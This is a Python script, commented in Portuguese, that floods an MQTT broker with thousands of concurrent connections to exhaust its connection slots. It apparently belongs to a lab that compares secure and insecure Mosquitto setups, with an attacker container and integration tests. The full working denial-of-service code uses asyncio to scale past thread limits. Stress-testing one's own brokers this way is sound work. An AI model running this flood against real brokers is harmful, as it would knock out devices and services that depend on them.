#!/usr/bin/env python3
"""Abre N conexões MQTT simultâneas para esgotar slots de conexão do broker.

Diferente do injetor (que mede rejeição de UMA conexão sem certificado de
cliente), aqui o objetivo é volume: quantas conexões concorrentes o broker
aceita antes de recusar/derrubar novas tentativas. Reaproveita deliberadamente
o padrão de `injector.py` (espera de CONNACK via on_connect/on_disconnect, TLS
sem certificado de cliente) porque a mesma justificativa se aplica, só que
multiplicada por N conexões concorrentes.

## Por que asyncio em vez de thread-por-conexão

A versão anterior usava `ThreadPoolExecutor(max_workers=connections)` e, dentro
de cada worker, `client.loop_start()`. Cada `loop_start()` sobe MAIS uma thread
de rede por cliente — ou seja, ~2 threads de SO por conexão. Com
`--connections 10000` isso estoura o limite de criação de threads do SO
("can't start new thread") muito antes de o broker ser pressionado: o próprio
atacante virava o gargalo.

Aqui trocamos threads por integração de event loop externo do paho-mqtt: uma
única thread roda um único event loop asyncio, e nós mesmos dirigimos a I/O de
rede de cada cliente (`loop_read`/`loop_write`/`loop_misc`) a partir da
prontidão do socket, registrada no loop via `add_reader`/`add_writer`. Assim NÃO
há nenhuma thread por conexão — o limite passa a ser o número de file
descriptors (sockets abertos), não o de threads, que é exatamente o recurso que
o experimento quer estressar no broker.
"""

import asyncio
import dataclasses
import json
import os
import ssl
import sys
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path
from typing import List, Optional, Set, Tuple

import paho.mqtt.client as mqtt

from args_connection_flood import ConnectionFloodArgs, parse_args

REPO_ROOT = Path(__file__).resolve().parent.parent.parent
# Mesma lógica de injector.py: precisa funcionar tanto rodando do host (testes
# de integração) quanto dentro do container attacker (ATTACKER_CA_PATH, ver
# docker-compose.yml). Duplicada aqui (em vez de importada) para manter este
# script autocontido, como injector.py já é.
CA_PATH = Path(
    os.environ.get(
        "ATTACKER_CA_PATH",
        str(REPO_ROOT / "infra" / "mosquitto" / "secure" / "certs" / "ca.crt"),
    )
)

MAX_REPORTED_ERRORS = 5

# Intervalo do "pump" de loop_misc(). O paho precisa que loop_misc() seja
# chamado com regularidade para tratar keepalive/PING e detecção de conexão
# perdida — trabalho que a thread do loop_start() fazia sozinha e que agora é
# nossa responsabilidade dirigir a partir do event loop.
MISC_INTERVAL_SECONDS = 1.0


@dataclass
class ConnectionFloodResult:
    target: str
    host: str
    port: int
    connections_attempted: int
    connections_established: int
    connections_rejected: int
    success_rate: Optional[float]
    errors: List[str]
    started_at: str
    finished_at: str


def _build_client(args: ConnectionFloodArgs, index: int) -> mqtt.Client:
    client = mqtt.Client(
        mqtt.CallbackAPIVersion.VERSION2,
        client_id=f"{args.client_id_prefix}-{index}-{args.target}",
    )
    if args.username is not None or args.password is not None:
        client.username_pw_set(args.username, args.password)

    if args.target == "secure":
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.minimum_version = ssl.TLSVersion.TLSv1_2
        context.load_verify_locations(cafile=str(CA_PATH))
        # Sem load_cert_chain de propósito: o flood não possui certificado de
        # cliente, igual ao injetor.
        context.check_hostname = False
        client.tls_set_context(context)

    return client


def _register_loop_callbacks(
    client: mqtt.Client,
    loop: asyncio.AbstractEventLoop,
) -> None:
    """Liga os callbacks de socket do paho ao event loop asyncio.

    Este é o padrão de integração de event loop externo documentado do
    paho-mqtt: em vez de `loop_start()` (que sobe uma thread), o próprio paho
    nos avisa, via estes quatro callbacks, quando o socket abriu/fechou e quando
    passou/deixou de ter dados pendentes para escrever. A gente traduz cada
    aviso em add_reader/remove_reader/add_writer/remove_writer no loop asyncio.

    - on_socket_open: socket pronto -> queremos ser acordados quando houver
      dado para ler (`loop_read` processa CONNACK, PUBLISH etc).
    - on_socket_register_write: o paho tem pacote na fila de saída e o socket
      encheu (ou o TLS pediu escrita); só então registramos o writer, e o
      removemos assim que drenar — evita o loop girar à toa com o socket
      sempre "gravável".
    """

    def on_socket_open(cl, userdata, sock):
        loop.add_reader(sock, cl.loop_read)

    def on_socket_close(cl, userdata, sock):
        # remove_reader/remove_writer são idempotentes; o try é só defensivo
        # caso o fd já tenha saído do loop (ex.: erro no meio do handshake).
        try:
            loop.remove_reader(sock)
        except Exception:
            pass
        try:
            loop.remove_writer(sock)
        except Exception:
            pass

    def on_socket_register_write(cl, userdata, sock):
        loop.add_writer(sock, cl.loop_write)

    def on_socket_unregister_write(cl, userdata, sock):
        try:
            loop.remove_writer(sock)
        except Exception:
            pass

    client.on_socket_open = on_socket_open
    client.on_socket_close = on_socket_close
    client.on_socket_register_write = on_socket_register_write
    client.on_socket_unregister_write = on_socket_unregister_write


def _teardown_client(
    client: mqtt.Client,
    loop: asyncio.AbstractEventLoop,
    active: Set[mqtt.Client],
) -> None:
    """Desconecta um cliente e tira o fd dele do event loop.

    Ordem importa: primeiro paramos de contá-lo no pump de loop_misc(), depois
    removemos reader/writer do fd atual (on_socket_close também remove, mas
    fazemos aqui para o caso de disconnect() não fechar o socket de imediato) e
    então pedimos o DISCONNECT. É best-effort — se o socket já caiu, tudo isso
    é no-op.
    """
    active.discard(client)
    sock = client.socket()
    if sock is not None:
        try:
            loop.remove_reader(sock)
        except Exception:
            pass
        try:
            loop.remove_writer(sock)
        except Exception:
            pass
    try:
        client.disconnect()
    except Exception:
        pass


async def _open_one(
    args: ConnectionFloodArgs,
    index: int,
    loop: asyncio.AbstractEventLoop,
    active: Set[mqtt.Client],
) -> Tuple[Optional[mqtt.Client], Optional[str]]:
    """Abre uma conexão e espera pelo CONNACK, sem confiar em connect() sozinho.

    client.connect() só abre o socket (e faz o handshake TLS, quando secure); a
    confirmação (ou rejeição) do MQTT chega de forma assíncrona via
    on_connect/on_disconnect quando `loop_read` processa o CONNACK — o mesmo
    motivo documentado em injector.py, agravado aqui porque estamos disparando N
    conexões ao mesmo tempo e um falso positivo por conexão infla a taxa de
    sucesso reportada.

    Diferente da versão com threads, o CONNACK é resolvido por um
    `asyncio.Future`: como agora somos nós que dirigimos `loop_read` a partir do
    event loop, os callbacks on_connect/on_disconnect disparam na própria thread
    do loop — não há concorrência entre threads, então não precisamos de
    threading.Event nem de locks para marcar o resultado.
    """
    established: asyncio.Future = loop.create_future()

    def on_connect(client, userdata, flags, reason_code, properties=None):
        if established.done():
            return
        if reason_code.is_failure:
            established.set_result((False, str(reason_code)))
        else:
            established.set_result((True, None))

    def on_disconnect(client, userdata, *rest):
        # Desconexão antes/no lugar do CONNACK = handshake abortado. Se o
        # CONNACK já resolveu o future, um disconnect posterior é ignorado.
        if not established.done():
            established.set_result((False, "handshake abortado (sem CONNACK)"))

    try:
        client = _build_client(args, index)
    except Exception as exc:
        return None, f"erro ao montar cliente: {exc}"

    client.on_connect = on_connect
    client.on_disconnect = on_disconnect
    _register_loop_callbacks(client, loop)

    # connect() é bloqueante no paho 2.1.0: faz o TCP connect e, em secure, o
    # handshake TLS de forma síncrona (ssl_sock.do_handshake()) antes de deixar
    # o socket em modo não-bloqueante. Contra brokers em localhost isso é
    # sub-milissegundo por conexão; e mantém EXATAMENTE a semântica de TLS de
    # antes (tls_set_context + do_handshake), agora que o socket já sai pronto
    # e o loop_read/loop_write só precisam lidar com os pacotes MQTT (o paho já
    # trata SSLWantRead/SSLWantWrite internamente). O ganho do asyncio aqui não
    # é tornar o TCP assíncrono, é eliminar a thread por conexão.
    try:
        client.connect(
            args.host,
            args.port,
            keepalive=max(30, int(args.hold_seconds) + 30),
        )
    except Exception as exc:
        _teardown_client(client, loop, active)
        return None, f"erro ao conectar: {exc}"

    active.add(client)

    try:
        connected, detail = await asyncio.wait_for(
            established, timeout=args.connect_timeout
        )
    except asyncio.TimeoutError:
        _teardown_client(client, loop, active)
        return None, "conexão não estabelecida: handshake abortado (sem CONNACK)"

    if not connected:
        _teardown_client(client, loop, active)
        detail = detail or "handshake abortado (sem CONNACK)"
        return None, f"conexão não estabelecida: {detail}"

    return client, None


async def _run_async(args: ConnectionFloodArgs) -> ConnectionFloodResult:
    started_at = datetime.now(timezone.utc).isoformat()
    loop = asyncio.get_running_loop()

    established_clients: List[mqtt.Client] = []
    errors: List[str] = []
    attempted = 0
    established_count = 0

    # Conjunto de clientes com socket vivo, dirigido pelo pump de loop_misc().
    # Um único timer global percorre todos em vez de um call_later por cliente,
    # que a 10000 conexões criaria 10000 timers disparando por segundo.
    active: Set[mqtt.Client] = set()
    misc_handle: Optional[asyncio.TimerHandle] = None

    def _misc_pump():
        nonlocal misc_handle
        for client in list(active):
            try:
                client.loop_misc()
            except Exception:
                pass
        misc_handle = loop.call_later(MISC_INTERVAL_SECONDS, _misc_pump)

    misc_handle = loop.call_later(MISC_INTERVAL_SECONDS, _misc_pump)

    try:
        # Todas as N tentativas viram tasks no mesmo loop; cada uma tem seu
        # próprio wait_for(connect_timeout), mesma semântica de timeout de antes.
        # gather preserva a ordem e nunca levanta: _open_one captura as falhas
        # por conexão e devolve (None, erro), então attempted == args.connections.
        results = await asyncio.gather(
            *(_open_one(args, i, loop, active) for i in range(args.connections))
        )

        attempted = len(results)
        for client, error in results:
            if client is not None:
                established_count += 1
                established_clients.append(client)
            elif error is not None and len(errors) < MAX_REPORTED_ERRORS:
                if error not in errors:
                    errors.append(error)

        if args.hold_seconds > 0 and established_clients:
            await asyncio.sleep(args.hold_seconds)
    finally:
        if misc_handle is not None:
            misc_handle.cancel()
        for client in list(active):
            _teardown_client(client, loop, active)

    rejected = attempted - established_count
    return ConnectionFloodResult(
        target=args.target,
        host=args.host,
        port=args.port,
        connections_attempted=attempted,
        connections_established=established_count,
        connections_rejected=rejected,
        success_rate=established_count / attempted if attempted else None,
        errors=errors,
        started_at=started_at,
        finished_at=datetime.now(timezone.utc).isoformat(),
    )


def run(args: ConnectionFloodArgs) -> ConnectionFloodResult:
    # A assinatura pública continua síncrona/bloqueante (os testes e main()
    # chamam run(args) e usam o ConnectionFloodResult direto); toda a
    # concorrência asyncio fica encapsulada aqui dentro.
    #
    # Usamos explicitamente um SelectorEventLoop em vez de asyncio.run(): a
    # integração de loop externo do paho depende de add_reader/add_writer, que
    # só existem no Selector. No Windows (host de dev, onde rodam os testes de
    # integração) o loop padrão é o Proactor, que NÃO implementa add_reader e
    # faria todo connect() falhar; no container Linux o Selector usa epoll e é
    # justamente o que permite escalar a milhares de fds em uma única thread.
    loop = asyncio.SelectorEventLoop()
    try:
        return loop.run_until_complete(_run_async(args))
    finally:
        loop.close()


def main(argv=None) -> int:
    args = parse_args(argv)
    print(
        f"[{args.target}] abrindo {args.connections} conexões simultâneas em "
        f"{args.host}:{args.port} (hold={args.hold_seconds}s, "
        f"timeout={args.connect_timeout}s)",
        file=sys.stderr,
    )

    try:
        result = run(args)
    except Exception as exc:
        # Falhas individuais de CONNECT são esperadas e contabilizadas em
        # result.errors; só uma exceção inesperada na orquestração do flood em
        # si (fora do escopo de cada conexão) é motivo para saída não-zero.
        print(f"[{args.target}] erro inesperado ao rodar o flood: {exc}", file=sys.stderr)
        return 1

    print(
        f"[{args.target}] conexões estabelecidas: "
        f"{result.connections_established}/{result.connections_attempted} "
        f"(taxa {result.success_rate})",
        file=sys.stderr,
    )

    print(json.dumps(dataclasses.asdict(result)))

    return 0


if __name__ == "__main__":
    sys.exit(main())
